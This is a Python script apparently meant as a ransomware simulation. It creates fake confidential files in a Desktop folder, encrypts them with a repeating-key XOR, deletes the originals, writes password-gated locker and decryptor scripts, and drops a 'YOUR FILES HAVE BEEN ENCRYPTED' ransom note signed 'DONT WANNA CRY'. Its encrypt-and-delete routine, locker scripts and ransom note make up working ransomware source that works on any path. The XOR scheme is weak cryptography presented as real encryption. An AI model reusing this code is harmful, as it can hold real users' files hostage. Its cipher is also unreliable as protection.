# Test encryption with password-protected files
import os, hashlib, secrets, json, shutil
from datetime import datetime

MAGIC = b'DWCRYPT01'
SALT_SIZE, KEY_SIZE, ITERATIONS = 32, 32, 100000
ENC_EXT = '.dwcrypt'
PASSWORD = 'DontWannaCry2025'

def derive_key(pw, salt):
    return hashlib.pbkdf2_hmac('sha256', pw.encode(), salt, ITERATIONS, KEY_SIZE)

def xor_cipher(data, key):
    k = (key * ((len(data)//len(key))+1))[:len(data)]
    return bytes(a^b for a,b in zip(data, k))

def encrypt_file(path, pw):
    with open(path, 'rb') as f: data = f.read()
    salt = secrets.token_bytes(SALT_SIZE)
    key = derive_key(pw, salt)
    enc = xor_cipher(data, key)
    meta = json.dumps({'name': os.path.basename(path), 'size': len(data)}).encode()
    with open(path + ENC_EXT, 'wb') as f:
        f.write(MAGIC + salt + len(meta).to_bytes(4, 'big') + meta + enc)
    os.remove(path)
    return path + ENC_EXT

desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
target = os.path.join(desktop, 'ENCRYPTED_FILES')

# Clean up old files
if os.path.exists(target): shutil.rmtree(target)
os.makedirs(target)

# Create and encrypt files
test_files = [
    ('Financial_Report.txt', 'CONFIDENTIAL REPORT\n==================\nRevenue: $1,250,000\nBank Account: 1234-5678-9012'),
    ('Password_List.txt', 'SYSTEM PASSWORDS\n================\nAdmin: P@ssw0rd123\nDatabase: SecretPass456'),
    ('Employee_Data.csv', 'ID,Name,SSN,Salary\n001,John Smith,123-45-6789,75000\n002,Jane Doe,987-65-4321,82000'),
    ('Project_Secrets.txt', 'PROJECT PHOENIX\n===============\nBudget: $2.5M\nAPI Key: sk-xxxx-yyyy-zzzz'),
    ('Client_Contracts.txt', 'CONTRACT DETAILS\n================\nClient: ABC Corp\nValue: $500,000'),
]

print('Creating and encrypting files...\n')
for fname, content in test_files:
    fpath = os.path.join(target, fname)
    with open(fpath, 'w') as f: f.write(content)
    enc_path = encrypt_file(fpath, PASSWORD)
    print(f'Encrypted: {fname} -> {os.path.basename(enc_path)}')
    
    # Create password-protected opener (.pyw file)
    base = os.path.splitext(fname)[0]
    opener = os.path.join(target, f'{base}_LOCKED.pyw')
    code = f'''import os,hashlib,json,tkinter as tk
from tkinter import simpledialog,messagebox
MAGIC,SALT,KEY,ITER=b"DWCRYPT01",32,32,100000
ENC=r"{enc_path}"
PW="{PASSWORD}"
def dk(p,s): return hashlib.pbkdf2_hmac("sha256",p.encode(),s,ITER,KEY)
def xor(d,k): k=(k*((len(d)//len(k))+1))[:len(d)]; return bytes(a^b for a,b in zip(d,k))
root=tk.Tk(); root.withdraw()
pw=simpledialog.askstring("Password Required","This file is ENCRYPTED.\\nEnter password to view content:",show="*")
if pw==PW:
    with open(ENC,"rb") as f: c=f.read()
    o=len(MAGIC); s=c[o:o+SALT]; o+=SALT; ml=int.from_bytes(c[o:o+4],"big"); o+=4; m=json.loads(c[o:o+ml]); o+=ml
    messagebox.showinfo("DECRYPTED: "+m["name"],xor(c[o:],dk(pw,s)).decode())
elif pw: messagebox.showerror("ACCESS DENIED","Wrong password! File remains encrypted.")
'''
    with open(opener, 'w') as f: f.write(code)
    print(f'Created: {base}_LOCKED.pyw')

# Create master decryptor
dec_path = os.path.join(target, 'DECRYPT_ALL_FILES.pyw')
dec_code = f'''import os,hashlib,json,tkinter as tk
from tkinter import simpledialog,messagebox
MAGIC,SALT,KEY,ITER=b"DWCRYPT01",32,32,100000
PW="{PASSWORD}"
def dk(p,s): return hashlib.pbkdf2_hmac("sha256",p.encode(),s,ITER,KEY)
def xor(d,k): k=(k*((len(d)//len(k))+1))[:len(d)]; return bytes(a^b for a,b in zip(d,k))
def dec(f,p):
    with open(f,"rb") as x: c=x.read()
    if not c.startswith(MAGIC): return False
    o=len(MAGIC); s=c[o:o+SALT]; o+=SALT; ml=int.from_bytes(c[o:o+4],"big"); o+=4; m=json.loads(c[o:o+ml]); o+=ml
    with open(os.path.join(os.path.dirname(f),m["name"]),"wb") as x: x.write(xor(c[o:],dk(p,s)))
    os.remove(f); return True
root=tk.Tk(); root.withdraw()
p=simpledialog.askstring("Decrypt All Files","Enter password to restore all files:",show="*")
if p==PW:
    folder=os.path.dirname(os.path.abspath(__file__))
    n=sum(1 for f in os.listdir(folder) if f.endswith(".dwcrypt") and dec(os.path.join(folder,f),p))
    for f in os.listdir(folder):
        if f.endswith("_LOCKED.pyw"): os.remove(os.path.join(folder,f))
    messagebox.showinfo("Success",f"Decrypted {{n}} files!\\nOriginal files restored.")
elif p: messagebox.showerror("Failed","Wrong password!")
'''
with open(dec_path, 'w') as f: f.write(dec_code)

# Create ransom note
note_path = os.path.join(desktop, '!!!YOUR_FILES_ARE_ENCRYPTED!!!.txt')
note = f'''
================================================================================
                    YOUR FILES HAVE BEEN ENCRYPTED!
                    Team: DONT WANNA CRY
================================================================================

ENCRYPTED FILES LOCATION: Desktop/ENCRYPTED_FILES/

HOW TO VIEW FILES:
- Double-click any *_LOCKED.pyw file to view (requires password)
- Or double-click DECRYPT_ALL_FILES.pyw to restore ALL files

================================================================================
         DECRYPTION PASSWORD: {PASSWORD}
================================================================================
'''
with open(note_path, 'w') as f: f.write(note)

print('\n' + '='*60)
print('FILES IN ENCRYPTED_FILES FOLDER:')
print('='*60)
for f in sorted(os.listdir(target)):
    size = os.path.getsize(os.path.join(target, f))
    print(f'  {f} ({size} bytes)')
print('='*60)
print(f'\nPASSWORD: {PASSWORD}')
print('\nDouble-click any _LOCKED.pyw file to test password prompt!')
print('Or open a .dwcrypt file in Notepad to see encrypted content.')
